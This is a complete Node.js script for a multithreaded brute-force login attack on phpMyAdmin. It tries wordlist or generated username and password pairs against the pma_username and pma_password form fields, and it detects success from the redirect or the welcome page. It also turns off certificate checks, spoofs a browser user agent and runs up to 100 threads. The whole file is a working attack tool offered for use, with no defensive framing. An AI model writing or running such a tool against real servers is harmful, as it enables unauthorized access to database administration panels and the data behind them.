const https = require('https');
const fs = require('fs');
const path = require('path');
const readline = require('readline-sync');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// 🛡️ Global error handlers
process.on('unhandledRejection', (error) => {
    console.error('🚨 Unhandled Promise Rejection:', error.message || error);
    process.exit(1);
});

process.on('uncaughtException', (error) => {
    console.error('🚨 Unhandled Exception:', error.message || error);
    process.exit(1);
});

// 🔐 Disable SSL certificate verification
const agent = new https.Agent({ rejectUnauthorized: false });

class Bruteforcer {
    constructor(options) {
        this.config = {
            url: options.url,
            loginsFile: options.loginsFile,
            passwordsFile: options.passwordsFile,
            generatePasswords: options.generate,
            chars: options.chars || 'abcdefghijklmnopqrstuvwxyz0123456789',
            minLen: options.min || 4,
            maxLen: options.max || 8,
            threads: options.threads || 5,
            delay: options.delay || 1000,
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };
        this.attempts = 0;
        this.found = false;
        this.logins = [];
        this.passwords = [];
    }

    async loadFile(filename) {
        const filePath = path.resolve(filename);
        if (!fs.existsSync(filePath)) {
            throw new Error(`File not found: ${filePath}`);
        }
        const data = fs.readFileSync(filePath, 'utf-8');
        const lines = data.split('\n').map(line => line.trim()).filter(Boolean);
        if (lines.length === 0) {
            throw new Error(`File is empty: ${filePath}`);
        }
        return lines;
    }

    *generatePasswords() {
        const chars = this.config.chars.split('');
        function* generate(current, length) {
            if (length === 0) {
                yield current;
                return;
            }
            for (const char of chars) {
                yield* generate(current + char, length - 1);
            }
        }

        for (let len = this.config.minLen; len <= this.config.maxLen; len++) {
            yield* generate('', len);
        }
    }

    async run() {
        try {
            console.log('\n[+] Loading data...');
            this.logins = await this.loadFile(this.config.loginsFile);

            if (this.config.generatePasswords) {
                this.passwords = Array.from(this.generatePasswords());
            } else {
                this.passwords = await this.loadFile(this.config.passwordsFile);
            }

            const total = this.logins.length * this.passwords.length;

            console.log('[+] Attack settings:');
            console.log(`- Target: ${this.config.url}`);
            console.log(`- Usernames: ${this.logins.length}`);
            console.log(`- Passwords: ${this.passwords.length}`);
            console.log(`- Threads: ${this.config.threads}`);
            console.log(`- Delay: ${this.config.delay}ms`);

            if (this.config.generatePasswords) {
                console.log(`- Generated passwords: ${this.config.minLen}-${this.config.maxLen} characters`);
                console.log(`- Charset used: ${this.config.chars}`);
            }

            console.log('\n[+] Starting brute force...\n');

            const startTime = Date.now();
            const workers = [];
            const chunkSize = Math.ceil(total / this.config.threads);

            for (let i = 0; i < this.config.threads; i++) {
                const start = i * chunkSize;
                const end = Math.min(start + chunkSize, total);

                const worker = new Worker(__filename, {
                    workerData: {
                        config: this.config,
                        logins: this.logins,
                        passwords: this.passwords,
                        start,
                        end
                    }
                });

                worker.on('message', (msg) => {
                    if (msg.type === 'found') {
                        this.found = true;
                        console.log(`\n[+] SUCCESS: ${msg.login}:${msg.password}`);
                        console.log(`[+] Attempts: ${this.attempts}/${total}`);
                        console.log(`[+] Time: ${((Date.now() - startTime) / 1000).toFixed(2)} seconds`);

                        workers.forEach(w => w.terminate());
                        readline.question("\nPress Enter to exit...");
                        process.exit(0);
                    } else if (msg.type === 'progress') {
                        this.attempts++;
                        process.stdout.write(`\rAttempts: ${this.attempts}/${total} (${((this.attempts / total) * 100).toFixed(1)}%)`);
                    }
                });

                workers.push(worker);
            }

            await Promise.all(workers.map(w => new Promise(resolve => w.on('exit', resolve))));

            if (!this.found) {
                console.log('\n[-] No valid credentials found');
            }

            readline.question("\nPress Enter to exit...");
        } catch (error) {
            console.error('\n[-] Error:', error.message);
            readline.question("\nPress Enter to exit...");
            process.exit(1);
        }
    }
}

// Worker thread
if (!isMainThread) {
    const { config, logins, passwords, start, end } = workerData;

    const tryLogin = async (login, password) => {
        const postData = `pma_username=${encodeURIComponent(login)}&pma_password=${encodeURIComponent(password)}`;
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': config.userAgent
            },
            rejectUnauthorized: false
        };

        return new Promise((resolve) => {
            const req = https.request(config.url, options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    if (res.statusCode === 302 && res.headers.location && res.headers.location.includes('index.php')) {
                        resolve(true);
                    } else if (data.includes('Welcome to phpMyAdmin')) {
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                });
            });

            req.on('error', () => resolve(false));
            req.write(postData);
            req.end();
        });
    };

    (async () => {
        for (let i = start; i < end && !workerData.found; i++) {
            const loginIndex = Math.floor(i / passwords.length);
            const passwordIndex = i % passwords.length;

            if (loginIndex >= logins.length || passwordIndex >= passwords.length) continue;

            const login = logins[loginIndex];
            const password = passwords[passwordIndex];

            if (await tryLogin(login, password)) {
                parentPort.postMessage({ type: 'found', login, password });
                break;
            }

            parentPort.postMessage({ type: 'progress' });

            if (config.delay > 0) {
                await new Promise(resolve => setTimeout(resolve, config.delay));
            }
        }

        parentPort.postMessage({ type: 'done' });
    })();
}

// Interactive configuration
function getOptionsFromUser() {
    console.log('=== Brute Force Configuration ===\n');

    const options = {};

    options.url = readline.question('Enter target URL (e.g., http://localhost/login): ');

    options.loginsFile = readline.question('Path to usernames file (e.g., logins.txt): ');

    const passwordMode = readline.question('Choose password mode (1 - File, 2 - Generate): ');
    options.generate = passwordMode.trim() === '2';

    if (options.generate) {
        options.chars = readline.question("Charset for password generation (default 'abcdefghijklmnopqrstuvwxyz0123456789'): ") ||
            'abcdefghijklmnopqrstuvwxyz0123456789';

        const minInput = readline.question('Minimum password length (default 4): ');
        options.min = Math.max(1, parseInt(minInput) || 4);

        const maxInput = readline.question('Maximum password length (default 8): ');
        options.max = Math.max(options.min, parseInt(maxInput) || 8);
    } else {
        options.passwordsFile = readline.question('Path to passwords file (e.g., passwords.txt): ');
    }

    const threadsInput = readline.question('Number of threads (1-100, default 5): ');
    options.threads = Math.max(1, Math.min(100, parseInt(threadsInput) || 5));

    const delayInput = readline.question('Delay between requests (ms, default 1000): ');
    options.delay = Math.max(0, parseInt(delayInput) || 1000);

    return options;
}

// Main thread
if (isMainThread) {
    const options = getOptionsFromUser();
    new Bruteforcer(options).run();
}
